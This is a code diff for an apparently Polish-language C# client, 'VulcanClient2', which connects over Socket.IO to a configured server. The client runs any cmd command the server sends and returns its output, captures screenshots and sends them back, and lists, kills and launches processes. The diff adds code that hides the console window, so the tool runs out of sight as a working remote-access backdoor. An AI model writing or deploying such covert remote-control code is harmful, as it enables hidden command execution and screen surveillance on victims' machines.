@@ -10,7 +10,11 @@ using System.Collections.Generic;
 using System.Linq;
 using System.ComponentModel;
 using Microsoft.Extensions.Configuration;
-using  System.Media;
+using System.Runtime.InteropServices;
+using Serilog;
+using Serilog.Events;
+
+
 namespace VulcanClient2
 {
     class ProcessDict
@@ -20,218 +24,244 @@ namespace VulcanClient2
         
         public string MainWindowTitle { get; set; }
     }
-    
+
     class Program
     {
-        public static IWebDriver WebDriver {get; set;}
-        public static Uri SocketUri {get; set;}
+
+        public static IWebDriver WebDriver { get; set; }
+        public static Uri SocketUri { get; set; }
         public static Uri WebsiteUri { get; set; }
-        static void RunWebDriver(DriverManager driverManager, Uri url)
-        {
-            try
-            {
-                WebDriver = driverManager.SelectedDriver.GetDriver();
-                WebDriver.Navigate().GoToUrl(url);
-            }
-            catch (WebDriverException e)
-            {
-                Console.WriteLine(e);
-            }
-        }
-        
+
+        public static Task Init { get; set; }
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetConsoleWindow();
+
+        [DllImport("user32.dll")]
+        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+
+        const int SW_HIDE = 0;
+        const int SW_SHOW = 5;
+
         static async Task Main(string[] args)
         {
-            Console.WriteLine("Vulcan Client v.1.0.3");
-            Console.OutputEncoding = Encoding.UTF8;
-            var builder = new ConfigurationBuilder()
-                .SetBasePath(Directory.GetCurrentDirectory())
-                .AddJsonFile("config.json");
-            
-            var config = builder.Build();
-            var adress = config.GetSection("Adress").Value;
+            var handle = GetConsoleWindow();
+            // Chowamy okno konsoli
+            ShowWindow(handle, SW_HIDE);
 
-            SocketUri = new Uri(adress+"clients");
-            var socket = new SocketIO(SocketUri);
-            var notification = new Notification(socket);
-            
-
-            socket.OnConnected += Socket_OnConnected;
-            socket.OnDisconnected += Socket_onDisconnected;
-            
-
-            socket.On("website", async response =>
+            Log.Logger = new LoggerConfiguration()
+                .MinimumLevel.Debug()
+                .MinimumLevel.Override("Microsoft", LogEventLevel.Warning)
+                .Enrich.FromLogContext()
+                .WriteTo.File(Directory.GetCurrentDirectory() + "/logs/LogFile.txt")
+                .CreateLogger();
+            try
             {
-                DriverManager driverManager = new DriverManager();
-                var currentDirectory = Directory.GetCurrentDirectory();
-                string url = response.GetValue(0).Value<string>("url");
-                bool urlIsOk = false; ;
-                try
-                {
-                    WebsiteUri = new Uri(url);
-                    urlIsOk = true;
-                }
-                catch (UriFormatException e)
-                {
-                    await Task.Run(() => notification.Danger.Send(e.Message));
-                }
+                Log.Information("Vulcan Client v.1.0.3");
+                var builder = new ConfigurationBuilder()
+                    .SetBasePath(Directory.GetCurrentDirectory())
+                    .AddJsonFile("config.json");
 
-                if (urlIsOk)
+                var config = builder.Build();
+                var adress = config.GetSection("Adress").Value;
+
+                SocketUri = new Uri(adress + "clients");
+                var socket = new SocketIO(SocketUri);
+                var notification = new Notification(socket);
+
+
+                socket.OnConnected += Socket_OnConnected;
+                socket.OnDisconnected += Socket_onDisconnected;
+
+
+                socket.On("website", async response =>
                 {
-                    string fileName;
-                    string driverPath = "";
+                    DriverManager driverManager = new DriverManager();
+                    var currentDirectory = Directory.GetCurrentDirectory();
+                    string url = response.GetValue(0).Value<string>("url");
+                    bool urlIsOk = false;
+                    ;
                     try
                     {
-                        fileName = driverManager.SelectedDriver.Filename;
-                        driverPath = $"{currentDirectory}/drivers/{fileName}";
+                        WebsiteUri = new Uri(url);
+                        urlIsOk = true;
                     }
-                    catch (NullReferenceException e)
+                    catch (UriFormatException e)
                     {
-                        Console.WriteLine(e.Message);
                         await Task.Run(() => notification.Danger.Send(e.Message));
                     }
 
-                    if (driverPath != "")
+                    if (urlIsOk)
                     {
-                        if (!File.Exists(driverPath))
+                        string fileName;
+                        string driverPath = "";
+                        try
                         {
-                            Console.WriteLine("Driver nie istnieje");
-                            try
+                            fileName = driverManager.SelectedDriver.Filename;
+                            driverPath = $"{currentDirectory}/drivers/{fileName}";
+                        }
+                        catch (NullReferenceException e)
+                        {
+                            Log.Fatal(e, "Wystapil problem z otwieraniem webDrivera");
+                            await Task.Run(() => notification.Danger.Send(e.Message));
+                        }
+
+                        if (driverPath != "")
+                        {
+                            if (!File.Exists(driverPath))
                             {
+                                Log.Debug("Driver nie istnieje");
+
                                 await driverManager.SelectedDriver.DownloadDriver();
+
+                                RunWebDriver(driverManager, WebsiteUri);
                             }
-                            catch (Exception e)
+                            else
                             {
-                                Console.WriteLine(e.Message);
+                                Log.Debug("Driver istnieje");
+                                RunWebDriver(driverManager, WebsiteUri);
                             }
 
-                            RunWebDriver(driverManager, WebsiteUri);
-                        }
-                        else
-                        {
-                            Console.WriteLine("Driver istnieje");
-                            RunWebDriver(driverManager, WebsiteUri);
-                        }
-
-                        await socket.EmitAsync("website", new
-                        {
-                            notification = new
+                            await socket.EmitAsync("website", new
                             {
-                                message = $"Pomyślnie uruchomiono strone {url}",
-                                pos = "bottom-right",
-                                status = "success"
-                            }
-                        });   
+                                notification = new
+                                {
+                                    message = $"Pomyślnie uruchomiono strone {url}",
+                                    pos = "bottom-right",
+                                    status = "success"
+                                }
+                            });
+                        }
                     }
-                }
-            });
-            
-            socket.On("command", async response =>
-            {
-                string cmd = "/C " + response.GetValue<string>();
-
-                var process = new Process();
-                process.StartInfo.FileName = "cmd";
-                process.StartInfo.Arguments = cmd;
-                process.StartInfo.CreateNoWindow = true;
-                process.StartInfo.UseShellExecute = false;
-                process.StartInfo.RedirectStandardOutput = true;
-                process.StartInfo.RedirectStandardError = true;
-                process.StartInfo.StandardErrorEncoding = Encoding.UTF8;
-                process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
-                
-                process.Start();
-
-                await process.WaitForExitAsync();
-
-                StreamReader reader = process.StandardOutput;
-                StreamReader errorReader = process.StandardError;
-                
-                string cmdOutput = reader.ReadToEnd();
-                string cmdError = errorReader.ReadToEnd();
-                Console.WriteLine(process.StandardOutput.ReadToEnd());
-
-                string output = cmdError != "" ? cmdError : cmdOutput;
-
-                Console.WriteLine(output);
-                Console.WriteLine(process.ExitCode);
-                await socket.EmitAsync("command", new
-                {
-                    message = output
                 });
-            });
 
-            socket.On("screenshot", async response =>
-            {
-                ScreenShoot sc = new ScreenShoot();
-                var imageBytes = sc.CaptureScreenToBytes(ImageFormat.Png);
-                string filename = $"{Guid.NewGuid()}.png";
-                await socket.EmitAsync("get_screenshoot", new
+                socket.On("command", async response =>
                 {
-                    img = imageBytes,
-                    filename = filename
-                });
-            });
-            
-            socket.On("process_list", async response =>
-            {
-                List<ProcessDict> processList = new List<ProcessDict>();
+                    string cmd = "/C " + response.GetValue<string>();
 
-                foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
-                {
-                    processList.Add(new ProcessDict {Name = process.ProcessName, Id = process.Id, MainWindowTitle = process.MainWindowTitle});
-                }
-                
-                await socket.EmitAsync("process_list", new
-                {
-                    processes = processList
-                });
-            });
-            
-            socket.On("process_kill", async response =>
-            {
-                int processId = response.GetValue(0).Value<int>("processId");
-                foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
-                {
-                    if (process.Id == processId)
-                    {
-                        process.Kill();
-                        await Task.Run(() => notification.Success.Send($"Pomyslnie zamknieto proces {processId}"));
-                    }
-                }
-            });
-            
-            socket.On("process_start", async response =>
-            {
-                string processName = response.GetValue(0).Value<string>("processName");
-                var process = new Process();
-                process.StartInfo.FileName = processName;
-                try
-                {
+                    var process = new Process();
+                    process.StartInfo.FileName = "cmd";
+                    process.StartInfo.Arguments = cmd;
+                    process.StartInfo.CreateNoWindow = true;
+                    process.StartInfo.UseShellExecute = false;
+                    process.StartInfo.RedirectStandardOutput = true;
+                    process.StartInfo.RedirectStandardError = true;
+                    process.StartInfo.StandardErrorEncoding = Encoding.UTF8;
+                    process.StartInfo.StandardOutputEncoding = Encoding.UTF8;
+
                     process.Start();
-                    await Task.Run(() => notification.Success.Send($"Pomyslnie uruchomino {processName}"));
-                }
-                catch (Win32Exception e)
+
+                    Log.Information($"Wyslano komende {cmd}");
+
+                    await process.WaitForExitAsync();
+
+                    StreamReader reader = process.StandardOutput;
+                    StreamReader errorReader = process.StandardError;
+
+                    string cmdOutput = reader.ReadToEnd();
+                    string cmdError = errorReader.ReadToEnd();
+
+                    string output = cmdError != "" ? cmdError : cmdOutput;
+
+                    Log.Debug(output);
+                    await socket.EmitAsync("command", new
+                    {
+                        message = output
+                    });
+                });
+
+                socket.On("screenshot", async response =>
                 {
-                    Console.WriteLine(e.Message);
-                    await Task.Run(() => notification.Danger.Send(e.Message + $" {processName}"));
-                }
-                
-            });
-            
-            await socket.ConnectAsync();
+                    ScreenShoot sc = new ScreenShoot();
+                    var imageBytes = sc.CaptureScreenToBytes(ImageFormat.Png);
+                    string filename = $"{Guid.NewGuid()}.png";
+                    Log.Information("Pomyslnie zrobiono zrzut ekranu");
+                    await socket.EmitAsync("get_screenshoot", new
+                    {
+                        img = imageBytes,
+                        filename = filename
+                    });
+                });
 
-            Console.ReadLine();
+                socket.On("process_list", async response =>
+                {
+                    List<ProcessDict> processList = new List<ProcessDict>();
+
+                    foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
+                    {
+                        processList.Add(new ProcessDict
+                            {Name = process.ProcessName, Id = process.Id, MainWindowTitle = process.MainWindowTitle});
+                    }
+
+                    await socket.EmitAsync("process_list", new
+                    {
+                        processes = processList
+                    });
+                });
+
+                socket.On("process_kill", async response =>
+                {
+                    int processId = response.GetValue(0).Value<int>("processId");
+                    foreach (var process in Process.GetProcesses().Where(p => p.MainWindowTitle != "").ToArray())
+                    {
+                        if (process.Id == processId)
+                        {
+                            process.Kill();
+                            Log.Information($"Pomyslnie zamknieto proces {processId}");
+                            await Task.Run(() => notification.Success.Send($"Pomyslnie zamknieto proces {processId}"));
+                        }
+                    }
+                });
+
+                socket.On("process_start", async response =>
+                {
+                    string processName = response.GetValue(0).Value<string>("processName");
+                    var process = new Process();
+                    process.StartInfo.FileName = processName;
+                    try
+                    {
+                        process.Start();
+                        Log.Information($"Pomyslnie uruchomino {processName}");
+                        await Task.Run(() => notification.Success.Send($"Pomyslnie uruchomino {processName}"));
+                    }
+                    catch (Win32Exception e)
+                    {
+                        Log.Fatal(e, $"Wystapil problem z otwieraniem procesu {processName}");
+                        await Task.Run(() => notification.Danger.Send(e.Message + $" {processName}"));
+                    }
+
+                });
+
+                await socket.ConnectAsync();
+
+                Console.ReadLine();
+            }
+            catch (Exception e)
+            {
+                Log.Fatal(e, "Wystapil problem z aplikacja");
+            }
+            finally
+            {
+                Log.CloseAndFlush();
+            }
         }
-
         private static void Socket_OnConnected(object sender, EventArgs e)
         {
             var socket = sender as SocketIO;
-            Console.WriteLine("Klient polaczony " + socket.Id);
+            Log.Debug("Klient polaczony " + socket.Id);
         }
 
         private static void Socket_onDisconnected(object sender, string e)
         {
-            Console.WriteLine("Klient rozlaczony");
+            Log.Debug("Klient rozlaczony");
+        }
+
+        static void RunWebDriver(DriverManager driverManager, Uri url)
+        {
+
+            WebDriver = driverManager.SelectedDriver.GetDriver();
+            WebDriver.Navigate().GoToUrl(url);
+            Log.Information($"Uruchomiono strone {url}");
         }
     }
 }
